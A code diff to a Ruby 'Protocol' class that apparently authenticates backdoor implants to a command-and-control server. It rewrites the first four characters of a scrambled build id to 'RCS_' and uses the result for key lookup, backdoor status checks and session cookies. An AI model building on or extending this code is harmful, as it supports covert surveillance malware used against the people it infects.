@@ -56,7 +56,10 @@ class Protocol
 
     # the build_id identification
     build_id = message.slice!(0..15)
-    trace :info, "[#{peer}] Auth -- BuildId: " << build_id.delete("\x00")
+    build_id_real = build_id.delete("\x00")
+    # substitute the first 4 chars with RCS_ because of the client side scrambling
+    build_id_real[0..3] = 'RCS_'
+    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real
 
     # instance of the device
     instance_id = message.slice!(0..19)
@@ -71,7 +74,7 @@ class Protocol
     trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
 
     # get the class key from the db
-    conf_key = DB.class_key_of build_id.delete("\x00")
+    conf_key = DB.class_key_of build_id_real
 
     # this class does not exist
     return if conf_key.nil?
@@ -90,7 +93,6 @@ class Protocol
     trace :info, "[#{peer}] Authentication phase 1 completed"
 
     # remove the trailing zeroes from the strings
-    build_id.delete!("\x00")
     instance_id = instance_id.unpack('H*').first
     subtype.delete!("\x00")
 
@@ -108,7 +110,7 @@ class Protocol
     message = aes_encrypt(ks, DB.backdoor_signature)
 
     # ask the database the status of the backdoor
-    status, bid = DB.backdoor_status(build_id, instance_id, subtype)
+    status, bid = DB.backdoor_status(build_id_real, instance_id, subtype)
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the backdoor status
@@ -124,7 +126,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.create(bid, build_id, instance_id, subtype, k)
+        cookie = SessionManager.create(bid, build_id_real, instance_id, subtype, k)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
